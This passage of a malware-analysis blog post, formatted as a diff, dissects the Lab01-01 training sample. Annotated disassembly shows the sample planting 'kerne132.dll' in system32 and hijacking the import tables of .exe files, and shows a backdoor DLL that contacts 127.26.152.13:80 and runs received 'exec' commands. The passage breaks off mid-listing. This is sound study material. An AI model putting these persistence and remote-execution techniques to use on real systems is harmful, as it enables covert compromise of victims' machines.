+<p>Now the malicious DLL is rebuilt, <em>Lab01-01.exe</em> writes it on disk inside the <em>C:\windows\system32</em> directory under the name <em>kerne123.dll</em> (recall the number “1” instead of the letter “l” <a href="#upd_export_dir_1">see earlier?</a>):</p>
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">0</span><span class="nf">x004017E8</span>    <span class="nv">push</span>    <span class="mi">0</span>               <span class="c1">; bFailIfExists</span>
+<span class="err">0</span><span class="nf">x004017EA</span>    <span class="nv">push</span>    <span class="nv">offset</span> <span class="nv">NewFileName</span> <span class="c1">; "C:\\windows\\system32\\kerne132.dll"</span>
+<span class="err">0</span><span class="nf">x004017EF</span>    <span class="nv">push</span>    <span class="nv">offset</span> <span class="nv">ExistingFileName</span> <span class="c1">; "Lab01-01.dll"</span>
+<span class="err">0</span><span class="nf">x004017F4</span>    <span class="nv">call</span>    <span class="nb">ds</span><span class="p">:</span><span class="nv">CopyFileA</span>
+</code></pre></div></div>
+
+<h4 id="searching-for-valid-targets">Searching for valid targets</h4>
+
+<p>Then, a recursive function is called, taking the string “<em>C:\</em>” and the integer <em>0</em> as parameters:</p>
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">0</span><span class="nf">x004017FC</span>    <span class="nv">push</span>    <span class="mi">0</span>               <span class="c1">; recursion_depth</span>
+<span class="err">[</span><span class="nf">...</span><span class="p">]</span>
+<span class="err">0</span><span class="nf">x00401806</span>    <span class="nv">push</span>    <span class="nv">offset</span> <span class="nv">aC</span>       <span class="c1">; "C:\\*"</span>
+<span class="err">0</span><span class="nf">x0040180B</span>    <span class="nv">call</span>    <span class="nv">RecurseFilesystem</span> <span class="c1">; 0x4011E0</span>
+</code></pre></div></div>
+<p>The function starts by comparing the integer parameter with the constant <em>7</em>, and exits if greater:</p>
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">0</span><span class="nf">x004011E0</span>    <span class="nv">mov</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="nv">recursion_depth</span><span class="p">]</span>
+<span class="err">0</span><span class="nf">x004011E4</span>    <span class="nv">sub</span>     <span class="nb">esp</span><span class="p">,</span> <span class="mh">144h</span>
+<span class="err">0</span><span class="nf">x004011EA</span>    <span class="nv">cmp</span>     <span class="nb">eax</span><span class="p">,</span> <span class="mi">7</span>
+<span class="err">[</span><span class="nf">...</span><span class="p">]</span>
+<span class="err">0</span><span class="nf">x004011F1</span>    <span class="nv">jg</span>      <span class="nv">exit</span>
+</code></pre></div></div>
+
+<p>If the level of recursion is less or equal to 7, the code flow reaches a call to the API <a href="https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-findfirstfilea"><em>FindFirstFileA</em></a>:</p>
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">0</span><span class="nf">x004011F7</span>    <span class="nv">mov</span>     <span class="nb">ebp</span><span class="p">,</span> <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="mh">154h</span><span class="o">+</span><span class="nv">lpFileName</span><span class="p">]</span>
+<span class="err">0</span><span class="nf">x004011FE</span>    <span class="nv">lea</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="mh">154h</span><span class="o">+</span><span class="nv">FindFileData</span><span class="p">]</span>
+<span class="err">0</span><span class="nf">x00401202</span>    <span class="nv">push</span>    <span class="nb">eax</span>             <span class="c1">; lpFindFileData </span>
+<span class="err">0</span><span class="nf">x00401203</span>    <span class="nv">push</span>    <span class="nb">ebp</span>             <span class="c1">; lpFileName ; "C:\\*"</span>
+<span class="err">0</span><span class="nf">x00401204</span>    <span class="nv">call</span>    <span class="nb">ds</span><span class="p">:</span><span class="nv">FindFirstFileA</span>
+</code></pre></div></div>
+
+<p>After the call to <em>FindFirstFileA</em>, the return code is checked:</p>
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">0</span><span class="nf">x00401219</span>   <span class="nv">test</span>    <span class="kt">byte</span> <span class="nv">ptr</span> <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="mh">154h</span><span class="o">+</span><span class="nv">FindFileData.dwFileAttributes</span><span class="p">],</span> <span class="nv">FILE_ATTRIBUTE_DIRECTORY</span>
+<span class="err">0</span><span class="nf">x0040121E</span>   <span class="nv">jz</span>      <span class="nv">not_a_dir</span>
+</code></pre></div></div>
+<p>If the call returns <em>FILE_ATTRIBUTE_DIRECTORY</em> (and the directory is neither “<em>.</em>” nor “<em>..</em>”), the name of the found directory is concatenated with the string used as <em>lpFileName</em> parameter for <em>FindFirstFileA</em> (thus building a new path), the depth parameter is incremented and the function recurses (code not shown).<br />
+If the call returns a file, the last 4 chars of its filename are compared with the hardcoded string “<em>.exe</em>”. If the comparison doesn’t match the search continues with a call to <a href="https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-findnextfilea"><em>FindNextFileA</em></a>:</p>
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">0</span><span class="nf">x0040136C</span>    <span class="nv">lea</span>     <span class="nb">ebx</span><span class="p">,</span> <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="nb">ecx</span><span class="o">+</span><span class="mh">154h</span><span class="o">+</span><span class="nv">FindFileData.dwReserved1</span><span class="p">]</span>
+<span class="err">[</span><span class="nf">...</span><span class="p">]</span>
+<span class="err">0</span><span class="nf">x004013A</span>     <span class="nv">push</span>    <span class="nv">offset</span> <span class="nv">aExe</span>     <span class="c1">; ".exe"</span>
+<span class="err">[</span><span class="nf">...</span><span class="p">]</span>
+<span class="err">0</span><span class="nf">x004013AC</span>    <span class="nv">push</span>    <span class="nb">ebx</span>             <span class="c1">; 4 last chars of the filename</span>
+<span class="err">[</span><span class="nf">...</span><span class="p">]</span>
+<span class="err">0</span><span class="nf">x004013F6</span>    <span class="nv">call</span>    <span class="nb">ds</span><span class="p">:</span><span class="nv">_stricmp</span>
+<span class="err">[</span><span class="nf">...</span><span class="p">]</span>
+<span class="err">0</span><span class="nf">x004013FF</span>    <span class="nv">test</span>    <span class="nb">eax</span><span class="p">,</span> <span class="nb">eax</span>
+<span class="err">0</span><span class="nf">x00401401</span>    <span class="nv">jnz</span>     <span class="nv">short</span> <span class="nv">not_an_exe</span>
+<span class="err">0</span><span class="nf">x00401403</span>    <span class="nv">push</span>    <span class="nb">ebp</span>                <span class="c1">; lpFileName</span>
+<span class="err">0</span><span class="nf">x00401404</span>    <span class="nv">call</span>    <span class="nv">HijackImportTable</span>  <span class="c1">; hijack import table</span>
+<span class="err">0</span><span class="nf">x00401409</span>    <span class="nv">add</span>     <span class="nb">esp</span><span class="p">,</span> <span class="mi">4</span>
+
+<span class="err">0</span><span class="nf">x0040140C</span> <span class="nv">not_an_exe</span><span class="p">:</span>
+<span class="err">0</span><span class="nf">x0040140C</span>    <span class="nv">mov</span>     <span class="nb">ebp</span><span class="p">,</span> <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="mh">154h</span><span class="o">+</span><span class="nv">lpFileName</span><span class="p">]</span>
+<span class="err">0</span><span class="nf">x00401413</span> <span class="nv">loc_401413</span><span class="p">:</span>
+<span class="err">0</span><span class="nf">x00401413</span>    <span class="nv">mov</span>     <span class="nb">esi</span><span class="p">,</span> <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="mh">154h</span><span class="o">+</span><span class="nv">hFindFile</span><span class="p">]</span>
+<span class="err">0</span><span class="nf">x00401417</span>    <span class="nv">lea</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="mh">154h</span><span class="o">+</span><span class="nv">FindFileData</span><span class="p">]</span>
+<span class="err">0</span><span class="nf">x0040141B</span>    <span class="nv">push</span>    <span class="nb">eax</span>             <span class="c1">; lpFindFileData</span>
+<span class="err">0</span><span class="nf">x0040141C</span>    <span class="nv">push</span>    <span class="nb">esi</span>             <span class="c1">; hFindFile</span>
+<span class="err">0</span><span class="nf">x0040141D</span>    <span class="nv">call</span>    <span class="nb">ds</span><span class="p">:</span><span class="nv">FindNextFileA</span>
+</code></pre></div></div>
+<p>However, if the file extension matches the string “<em>.exe</em>”, we reach address <em>0x00401404</em> and call the function I’ve renamed <em>HijackImportTable()</em>.</p>
+
+<h4 id="hijack-import-table">Hijack import table</h4>
+<p>A refresher on <strong>import table</strong> is available <a href="/cheatsheets/pe/#import_table">here</a>.<br />
+When a valid target is found, the function <em>HijackImportTable()</em> is called. It starts by mapping a view of the target file in memory with <em>read</em> and <em>write</em> permissions. This is similar to what we have seen with <a href="#memory_mapping_1">earlier mappings of DLLs</a>.<br />
+Then, the <strong>PE signature</strong> of the target is checked:</p>
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">esi</span><span class="o">-&gt;</span><span class="nv">mapped</span> <span class="nv">file</span>
+<span class="err">004010</span><span class="nf">FA</span>    <span class="nv">mov</span>     <span class="nb">ebp</span><span class="p">,</span> <span class="p">[</span><span class="nb">esi</span><span class="o">+</span><span class="mh">3Ch</span><span class="p">]</span>
+<span class="err">[</span><span class="nf">...</span><span class="p">]</span>
+<span class="err">00401112</span>    <span class="nf">cmp</span>     <span class="kt">dword</span> <span class="nv">ptr</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="mi">0</span><span class="p">],</span> <span class="s">'EP'</span>
+<span class="err">00401119</span>    <span class="nf">jnz</span>     <span class="nv">exit</span>
+</code></pre></div></div>
+
+<p>If the signature is valid, the malware get the RVA of the import table of the target executable and converts it to a valid mapped address:</p>
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">;ebp-&gt;NtHeaders.signature</span>
+<span class="err">0</span><span class="nf">x0040111F</span>    <span class="nv">mov</span>     <span class="nb">ecx</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="mh">80h</span><span class="p">]</span>
+<span class="err">0</span><span class="nf">x00401125</span>    <span class="nv">push</span>    <span class="nb">esi</span>             <span class="c1">; baseMappedView</span>
+<span class="err">0</span><span class="nf">x00401126</span>    <span class="nv">push</span>    <span class="nb">ebp</span>             <span class="c1">; pNtHeaders</span>
+<span class="err">0</span><span class="nf">x00401127</span>    <span class="nv">push</span>    <span class="nb">ecx</span>             <span class="c1">; RVA</span>
+<span class="err">0</span><span class="nf">x00401128</span>    <span class="nv">call</span>    <span class="nv">RVA2MappedAddress</span>
+<span class="err">0</span><span class="nf">x0040112D</span>    <span class="nv">add</span>     <span class="nb">esp</span><span class="p">,</span> <span class="mh">0Ch</span>
+<span class="err">0</span><span class="nf">x00401130</span>    <span class="nv">mov</span>     <span class="nb">edi</span><span class="p">,</span> <span class="nb">eax</span>       <span class="c1">; -&gt;IMAGE_IMPORT_DESCRIPTOR</span>
+</code></pre></div></div>
+<p>This allows to retrieve a pointer to the first <strong>IMAGE_IMPORT_DESCRIPTOR</strong> structure of the target executable.<br />
+Then, a pointer to the name of the DLL is retrieved from the value of the field <strong>IMAGE_IMPORT_DESCRIPTOR.NameRVA</strong></p>
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">; edi-&gt;IMAGE_IMPORT_DESCRIPTOR</span>
+<span class="err">0</span><span class="nf">x0040113F</span>    <span class="nv">add</span>     <span class="nb">edi</span><span class="p">,</span> <span class="mh">0Ch</span>        <span class="c1">; NameRVA</span>
+<span class="err">[</span><span class="nf">...</span><span class="p">]</span>
+<span class="err">0</span><span class="nf">x00401152</span>    <span class="nv">mov</span>     <span class="nb">edx</span><span class="p">,</span> <span class="p">[</span><span class="nb">edi</span><span class="p">]</span>
+<span class="err">0</span><span class="nf">x00401154</span>    <span class="nv">push</span>    <span class="nb">esi</span>             <span class="c1">; baseMappedView</span>
+<span class="err">0</span><span class="nf">x00401155</span>    <span class="nv">push</span>    <span class="nb">ebp</span>             <span class="c1">; pNtHeaders</span>
+<span class="err">0</span><span class="nf">x00401156</span>    <span class="nv">push</span>    <span class="nb">edx</span>             <span class="c1">; RVA</span>
+<span class="err">0</span><span class="nf">x00401157</span>    <span class="nv">call</span>    <span class="nv">RVA2MappedAddress</span>
+<span class="err">0</span><span class="nf">x0040115C</span>    <span class="nv">add</span>     <span class="nb">esp</span><span class="p">,</span> <span class="mh">0Ch</span> 
+<span class="err">0</span><span class="nf">x0040115F</span>    <span class="nv">mov</span>     <span class="nb">ebx</span><span class="p">,</span> <span class="nb">eax</span>
+</code></pre></div></div>
+<p>The name od the DLL is compared with the string “<em>kernel32.dll</em>”:</p>
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">; ebx-&gt;dll name</span>
+<span class="err">0</span><span class="nf">x0040116E</span>    <span class="nv">push</span>    <span class="nv">offset</span> <span class="nv">Str2</span>     <span class="c1">; "kernel32.dll"</span>
+<span class="err">0</span><span class="nf">x00401173</span>    <span class="nv">push</span>    <span class="nb">ebx</span>             <span class="c1">; dll name</span>
+<span class="err">0</span><span class="nf">x00401174</span>    <span class="nv">call</span>    <span class="nb">ds</span><span class="p">:</span><span class="nv">_stricmp</span>     <span class="c1">; case insensitive comparison</span>
+<span class="err">0</span><span class="nf">x0040117A</span>    <span class="nv">add</span>     <span class="nb">esp</span><span class="p">,</span> <span class="mi">8</span>
+<span class="err">0</span><span class="nf">x0040117D</span>    <span class="nv">test</span>    <span class="nb">eax</span><span class="p">,</span> <span class="nb">eax</span>
+<span class="err">0</span><span class="nf">x0040117F</span>   <span class="nv">jnz</span>     <span class="nv">short</span> <span class="nv">not_k32_thunk</span>
+</code></pre></div></div>
+<p>If the strings doesn’t match, the next <strong>IMAGE_IMPORT_DESCRIPTOR</strong> is checked. However, if the strings match, the string “<em>kernel32.dll</em>” is replaced with the string “<em>kerne132.dll</em>” (number “<em>1</em>” instead of letter “<em>l</em>”):</p>
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">; ebx-&gt;dll name</span>
+<span class="err">0</span><span class="nf">x00401181</span>    <span class="nv">mov</span>     <span class="nb">edi</span><span class="p">,</span> <span class="nb">ebx</span>
+<span class="err">0</span><span class="nf">x00401183</span>    <span class="nv">or</span>      <span class="nb">ecx</span><span class="p">,</span> <span class="mh">0FFFFFFFFh</span>
+<span class="err">0</span><span class="nf">x00401186</span>    <span class="nv">repne</span> <span class="nv">scasb</span>
+<span class="err">0</span><span class="nf">x00401188</span>    <span class="nv">not</span>     <span class="nb">ecx</span>
+<span class="err">0</span><span class="nf">x0040118A</span>    <span class="nv">mov</span>     <span class="nb">eax</span><span class="p">,</span> <span class="nb">ecx</span> <span class="c1">; length</span>
+<span class="err">0</span><span class="nf">x0040118C</span>    <span class="nv">mov</span>     <span class="nb">esi</span><span class="p">,</span> <span class="nv">offset</span> <span class="nv">fakename</span> <span class="c1">; "kerne132.dll"</span>
+<span class="err">0</span><span class="nf">x00401191</span>    <span class="nv">mov</span>     <span class="nb">edi</span><span class="p">,</span> <span class="nb">ebx</span>
+<span class="err">0</span><span class="nf">x00401193</span>    <span class="nv">shr</span>     <span class="nb">ecx</span><span class="p">,</span> <span class="mi">2</span> <span class="c1">; length/4</span>
+<span class="err">0</span><span class="nf">x00401196</span>    <span class="nv">rep</span> <span class="nv">movsd</span>    <span class="c1">; copy dwords</span>
+<span class="err">0</span><span class="nf">x00401198</span>    <span class="nv">mov</span>     <span class="nb">ecx</span><span class="p">,</span> <span class="nb">eax</span>
+<span class="err">0</span><span class="nf">x0040119A</span>    <span class="nv">and</span>     <span class="nb">ecx</span><span class="p">,</span> <span class="mi">3</span>
+<span class="err">0</span><span class="nf">x0040119D</span>    <span class="nv">rep</span> <span class="nv">movsb</span> <span class="c1">; copy remaining bytes</span>
+</code></pre></div></div>
+<p>And that’s it, now <strong>IMAGE_IMPORT_DESCRIPTOR.NameRVA</strong> will be the RVA of the malicious DLL name, the DLL that has been copied in the <em>C:\Windows\System32</em> folder. Next time one of the compromised executable in <em>C:\Windows\System32\</em> is executed, the malicious DLL will be loaded.</p>
+
+<h2 id="dll_analysis">Analysis of the malicious DLL</h2>
+
+<p>If the malicious DLL is loaded, the <em>_DLLMain()</em> function is executed:</p>
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">0</span><span class="nf">x10001342</span>    <span class="nv">push</span>    <span class="nb">edi</span>             <span class="c1">; lpvReserved</span>
+<span class="err">0</span><span class="nf">x10001343</span>    <span class="nv">push</span>    <span class="nb">esi</span>             <span class="c1">; fdwReason</span>
+<span class="err">0</span><span class="nf">x10001344</span>    <span class="nv">push</span>    <span class="nb">ebx</span>             <span class="c1">; hinstDLL</span>
+<span class="err">0</span><span class="nf">x10001345</span>    <span class="nv">call</span>    <span class="nv">_DLLMain</span>
+</code></pre></div></div>
+
+<h3 id="mutex">Mutex</h3>
+
+<p>The <em>_DLLMain()</em> function starts by checking the existence of a mutex named “<em>SADFHUHF</em>” with a call to <em>OpenMutexA</em>. If the mutex already exists the codeflow jumps to the end of function, else the mutext is created:</p>
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">0</span><span class="nf">x10001067</span>    <span class="nv">push</span>    <span class="nv">offset</span> <span class="nv">Name</span>     <span class="c1">; "SADFHUHF"</span>
+<span class="err">0</span><span class="nf">x1000106C</span>    <span class="nv">push</span>    <span class="nb">eax</span>             <span class="c1">; bInitialOwner</span>
+<span class="err">0</span><span class="nf">x1000106D</span>    <span class="nv">push</span>    <span class="nb">eax</span>             <span class="c1">; lpMutexAttributes</span>
+<span class="err">0</span><span class="nf">x1000106E</span>    <span class="nv">call</span>    <span class="nb">ds</span><span class="p">:</span><span class="nv">CreateMutexA</span>
+</code></pre></div></div>
+
+<h3 id="socket">Socket</h3>
+
+<p>Then, a socket is created in order to communicate with IP address 127.26.152.13 on port 80:</p>
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">0</span><span class="nf">x10001078</span>    <span class="nv">push</span>    <span class="nb">ecx</span>             <span class="c1">; lpWSAData</span>
+<span class="err">0</span><span class="nf">x10001079</span>    <span class="nv">push</span>    <span class="mh">202h</span>            <span class="c1">; wVersionRequested</span>
+<span class="err">0</span><span class="nf">x1000107E</span>    <span class="nv">call</span>    <span class="nb">ds</span><span class="p">:</span><span class="nv">WSAStartup</span>   <span class="c1">; init. Winsock usage</span>
+<span class="err">0</span><span class="nf">x10001084</span>    <span class="nv">test</span>    <span class="nb">eax</span><span class="p">,</span> <span class="nb">eax</span>
+<span class="err">0</span><span class="nf">x10001086</span>    <span class="nv">jnz</span>     <span class="nv">exit</span>
+<span class="err">0</span><span class="nf">x1000108C</span>    <span class="nv">push</span>    <span class="nv">IPPROTO_TCP</span>     <span class="c1">; protocol</span>
+<span class="err">0</span><span class="nf">x1000108E</span>    <span class="nv">push</span>    <span class="nv">SOCK_STREAM</span>     <span class="c1">; type</span>
+<span class="err">0</span><span class="nf">x10001090</span>    <span class="nv">push</span>    <span class="nv">AF_INET</span>         <span class="c1">; af</span>
+<span class="err">0</span><span class="nf">x10001092</span>    <span class="nv">call</span>    <span class="nb">ds</span><span class="p">:</span><span class="nv">socket</span>       <span class="c1">; create socket</span>
+<span class="err">0</span><span class="nf">x10001098</span>    <span class="nv">mov</span>     <span class="nb">esi</span><span class="p">,</span> <span class="nb">eax</span>
+<span class="err">0</span><span class="nf">x1000109A</span>    <span class="nv">cmp</span>     <span class="nb">esi</span><span class="p">,</span> <span class="mh">0FFFFFFFFh</span>
+<span class="err">0</span><span class="nf">x1000109D</span>    <span class="nv">jz</span>      <span class="nb">cl</span><span class="nv">eanup</span>
+<span class="err">0</span><span class="nf">x100010A3</span>    <span class="nv">push</span>    <span class="nv">offset</span> <span class="nv">cp</span>       <span class="c1">; "127.26.152.13"</span>
+<span class="err">0</span><span class="nf">x100010A8</span>    <span class="nv">mov</span>     <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="mh">120Ch</span><span class="o">+</span><span class="nv">name.sa_family</span><span class="p">],</span> <span class="nv">AF_INET</span>
+<span class="err">0</span><span class="nf">x100010AF</span>    <span class="nv">call</span>    <span class="nb">ds</span><span class="p">:</span><span class="nv">inet_addr</span>    <span class="c1">; proper formatting</span>
+<span class="err">0</span><span class="nf">x100010B5</span>    <span class="nv">push</span>    <span class="mi">80</span>              <span class="c1">; hostshort (port)</span>
+<span class="err">0</span><span class="nf">x100010B7</span>    <span class="nv">mov</span>     <span class="kt">dword</span> <span class="nv">ptr</span> <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="mh">120Ch</span><span class="o">+</span><span class="nv">name.sa_data</span><span class="o">+</span><span class="mi">2</span><span class="p">],</span> <span class="nb">eax</span> <span class="c1">; IP</span>
+<span class="err">0</span><span class="nf">x100010BB</span>    <span class="nv">call</span>    <span class="nb">ds</span><span class="p">:</span><span class="nv">htons</span>        <span class="c1">; to network byte order</span>
+<span class="err">0</span><span class="nf">x100010C1</span>    <span class="nv">lea</span>     <span class="nb">edx</span><span class="p">,</span> <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="mh">1208h</span><span class="o">+</span><span class="nv">name</span><span class="p">]</span>
+<span class="err">0</span><span class="nf">x100010C5</span>    <span class="nv">push</span>    <span class="mh">10h</span>             <span class="c1">; namelen</span>
+<span class="err">0</span><span class="nf">x100010C7</span>    <span class="nv">push</span>    <span class="nb">edx</span>             <span class="c1">; name</span>
+<span class="err">0</span><span class="nf">x100010C8</span>    <span class="nv">push</span>    <span class="nb">esi</span>             <span class="c1">; s</span>
+<span class="err">0</span><span class="nf">x100010C9</span>    <span class="nv">mov</span>     <span class="kt">word</span> <span class="nv">ptr</span> <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="mh">1214h</span><span class="o">+</span><span class="nv">name.sa_data</span><span class="p">],</span> <span class="nb">ax</span> <span class="c1">; port</span>
+<span class="err">0</span><span class="nf">x100010CE</span>    <span class="nv">call</span>    <span class="nb">ds</span><span class="p">:</span><span class="nv">connect</span>     <span class="c1">; connect to 127.26.152.13:80</span>
+</code></pre></div></div>
+
+<p>If the connection is successful, the string <em>hello</em> is sent with the API <a href="https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-send"><em>send</em></a>:</p>
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">0</span><span class="nf">x100010FA</span>    <span class="nv">push</span>    <span class="nb">ecx</span>             <span class="c1">; len</span>
+<span class="err">0</span><span class="nf">x100010FB</span>    <span class="nv">push</span>    <span class="nv">offset</span> <span class="nv">buf</span>      <span class="c1">; "hello"</span>
+<span class="err">0</span><span class="nf">x10001100</span>    <span class="nv">push</span>    <span class="nb">esi</span>             <span class="c1">; s</span>
+<span class="err">0</span><span class="nf">x10001101</span>    <span class="nv">call</span>    <span class="nb">ds</span><span class="p">:</span><span class="nv">send</span>
+</code></pre></div></div>
+
+<p>And data are received with a call to the API <a href="https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-recv"><em>recv</em></a>:</p>
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">0</span><span class="nf">x10001122</span>    <span class="nv">push</span>    <span class="mi">0</span>               <span class="c1">; flags</span>
+<span class="err">0</span><span class="nf">x10001124</span>    <span class="nv">lea</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="mh">120Ch</span><span class="o">+</span><span class="nv">data_recieved</span><span class="p">]</span>
+<span class="err">0</span><span class="nf">x1000112B</span>    <span class="nv">push</span>    <span class="mh">1000h</span>           <span class="c1">; len</span>
+<span class="err">0</span><span class="nf">x10001130</span>    <span class="nv">push</span>    <span class="nb">eax</span>             <span class="c1">; buf</span>
+<span class="err">0</span><span class="nf">x10001131</span>    <span class="nv">push</span>    <span class="nb">esi</span>             <span class="c1">; s</span>
+<span class="err">0</span><span class="nf">x10001132</span>    <span class="nv">call</span>    <span class="nb">ds</span><span class="p">:</span><span class="nv">recv</span>
+<span class="err">0</span><span class="nf">x10001138</span>    <span class="nv">test</span>    <span class="nb">eax</span><span class="p">,</span> <span class="nb">eax</span>
+<span class="err">0</span><span class="nf">x1000113A</span>    <span class="nv">jle</span>     <span class="nv">short</span> <span class="nv">retry</span>
+</code></pre></div></div>
+
+<h3 id="commands">Commands</h3>
+
+<p>The malicious DLL can process 3 commands: <em>sleep</em>, <em>q</em> (quit) and <em>exec</em>.</p>
+<ol>
+  <li><strong>sleep</strong>: sleep for 0x60000 milliseconds:
+    <div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">0</span><span class="nf">x10001143</span>    <span class="nv">push</span>    <span class="mi">5</span>               <span class="c1">; MaxCount</span>
+<span class="err">0</span><span class="nf">x10001145</span>    <span class="nv">push</span>    <span class="nb">ecx</span>             <span class="c1">; data received</span>
+<span class="err">0</span><span class="nf">x10001146</span>    <span class="nv">push</span>    <span class="nv">offset</span> <span class="nv">Str1</span>     <span class="c1">; "sleep"</span>
+<span class="err">0</span><span class="nf">x1000114B</span>    <span class="nv">call</span>    <span class="nb">ebp</span> <span class="c1">; strncmp</span>
+<span class="err">0</span><span class="nf">x1000114D</span>    <span class="nv">add</span>     <span class="nb">esp</span><span class="p">,</span> <span class="mh">0Ch</span>
+<span class="err">0</span><span class="nf">x10001150</span>    <span class="nv">test</span>    <span class="nb">eax</span><span class="p">,</span> <span class="nb">eax</span>
+<span class="err">0</span><span class="nf">x10001152</span>    <span class="nv">jnz</span>     <span class="nv">short</span> <span class="nv">dont_sleep</span>
+<span class="err">0</span><span class="nf">x10001154</span>    <span class="nv">push</span>    <span class="mh">60000h</span>          <span class="c1">; dwMilliseconds</span>
+<span class="err">0</span><span class="nf">x10001159</span>    <span class="nv">call</span>    <span class="nb">ds</span><span class="p">:</span><span class="nv">Sleep</span>
+<span class="err">0</span><span class="nf">x1000115F</span>    <span class="nv">jmp</span>     <span class="nv">short</span> <span class="nv">retry</span>
+</code></pre></div>    </div>
+  </li>
+  <li><strong>q</strong>: close socket and quit:
+    <div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">100011</span><span class="nf">B6</span>    <span class="nv">cmp</span>     <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="mh">1208h</span><span class="o">+</span><span class="nv">data_received</span><span class="p">],</span> <span class="s">'q'</span>
+<span class="err">100011</span><span class="nf">BE</span>    <span class="nv">jz</span>      <span class="nv">short</span> <span class="nv">cmd_quit</span>
+</code></pre></div>    </div>
+  </li>
+  <li><strong>exec</strong>: use the string following the command <em>exec</em> as <em>lpCommandLine</em> parameter for the API <a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa"><em>CreateProcessA</em></a>:
+    <div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">0</span><span class="nf">x10001161</span>    <span class="nv">lea</span>     <span class="nb">edx</span><span class="p">,</span> <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="mh">1208h</span><span class="o">+</span><span class="nv">data_received</span><span class="p">]</span>
+<span class="err">0</span><span class="nf">x10001168</span>    <span class="nv">push</span>    <span class="mi">4</span>               <span class="c1">; MaxCount</span>
+<span class="err">0</span><span class="nf">x1000116A</span>    <span class="nv">push</span>    <span class="nb">edx</span>             <span class="c1">; Str2</span>
+<span class="err">0</span><span class="nf">x1000116B</span>    <span class="nv">push</span>    <span class="nv">offset</span> <span class="nv">aExec</span>    <span class="c1">; "exec"</span>
+<span class="err">0</span><span class="nf">x10001170</span>    <span class="nv">call</span>    <span class="nb">ebp</span> <span class="c1">; strncmp</span>
+<span class="err">0</span><span class="nf">x10001172</span>    <span class="nv">add</span>     <span class="nb">esp</span><span class="p">,</span> <span class="mh">0Ch</span>
+<span class="err">0</span><span class="nf">x10001175</span>    <span class="nv">test</span>    <span class="nb">eax</span><span class="p">,</span> <span class="nb">eax</span>
+<span class="err">0</span><span class="nf">x10001177</span>    <span class="nv">jnz</span>     <span class="nv">short</span> <span class="nv">dont_exec</span>
+<span class="err">[</span><span class="nf">...</span><span class="p">]</span>
+<span class="err">0</span><span class="nf">x1000118C</span>    <span class="nv">push</span>    <span class="nb">eax</span>             <span class="c1">; lpProcessInformation</span>
+<span class="err">0</span><span class="nf">x1000118D</span>    <span class="nv">push</span>    <span class="nb">ecx</span>             <span class="c1">; lpStartupInfo</span>
+<span class="err">0</span><span class="nf">x1000118E</span>    <span class="nv">push</span>    <span class="mi">0</span>               <span class="c1">; lpCurrentDirectory</span>
+<span class="err">0</span><span class="nf">x10001190</span>    <span class="nv">push</span>    <span class="mi">0</span>               <span class="c1">; lpEnvironment</span>
+<span class="err">0</span><span class="nf">x10001192</span>    <span class="nv">push</span>    <span class="mh">8000000h</span>        <span class="c1">; dwCreationFlags</span>
+<span class="err">0</span><span class="nf">x10001197</span>    <span class="nv">push</span>    <span class="mi">1</span>               <span class="c1">; bInheritHandles</span>
+<span class="err">0</span><span class="nf">x10001199</span>    <span class="nv">push</span>    <span class="mi">0</span>               <span class="c1">; lpThreadAttributes</span>
